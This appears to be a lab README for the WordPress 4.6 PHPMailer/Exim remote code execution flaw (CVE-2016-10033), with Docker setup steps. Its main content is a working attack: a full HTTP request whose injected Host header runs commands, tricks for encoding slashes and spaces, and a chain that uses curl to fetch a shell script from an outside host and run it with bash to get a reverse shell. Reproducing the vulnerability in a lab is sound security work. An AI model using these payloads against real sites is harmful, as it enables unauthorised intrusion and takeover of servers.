# Wordpress 4.6 Arbitrary Command Execution Vulnerability (PwnScriptum)

## Principle

Reference https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html

## test environment

Compile and run the test environment

```
Docker-compose build
Docker-compose up -d
```

Since Mysql initialization takes a while, please wait. After running successfully, open the site, initialize the administrator username and password and use it (the database is configured and not automatically updated).

## Testing and EXP use

Send the following packet, you can see that `/tmp/success` has been successfully created:

```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10 }{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
Connection: close
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Accept: */*
Content-Length: 56
Content-Type: application/x-www-form-urlencoded

Wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

But in actual use, there are still some pits that need to be stepped on. There are several specific pits:

1. The executed command cannot contain a large number of special characters, such as ``, quotation marks, etc.
2. The command will be converted to lowercase letters
3. The command needs to use an absolute path
4. Need to know the username of an existing user

To solve these pits, the vulnerability author came up with the `${substr{0}{1}{$spool_directory}}` instead of `/`, using `${substr{10}{1}{$tod_log}}` A method of replacing spaces.

However, there are still a lot of characters that can't be used, so we need to put the command to be executed on the third-party website, and then download it to /tmp by `curl -o /tmp/rce example.com/shell.sh`. In the directory, go to execute.

Therefore, the overall utilization process is as follows:

1. Write the exp of the bounce shell and put it on a web page. Have the following requirements:
  - Uppercase letters of the entire url will be converted to lowercase, so uppercase and less sensitive systems should not use uppercase letters for file paths.
  - Access to this page cannot be jumped because the parameter for follow jump is `-L` (uppercase)
2. Splice into the command `/usr/bin/curl -o/tmp/rce example.com/shell.sh` and the command `/bin/bash /tmp/rce`
3. Convert the spaces and `/` in the above command to `${substr{10}{1}{$tod_log}}` and `${substr{0}{1}{$spool_directory}}`
4. Socket the HTTP header into the HTTP header: `target(any -froot@localhost -be ${run{command}} null)`
5. Send the two stitched packets in sequence

I will write the above process as [exp script] (exploit.py), modify the target in the script to your target, user to an existing user, and `shell_url` to the URL where you placed the payload. (Or directly target as the first parameter, `shell_url` as the second parameter)

Execute to get the shell:

![](1.png)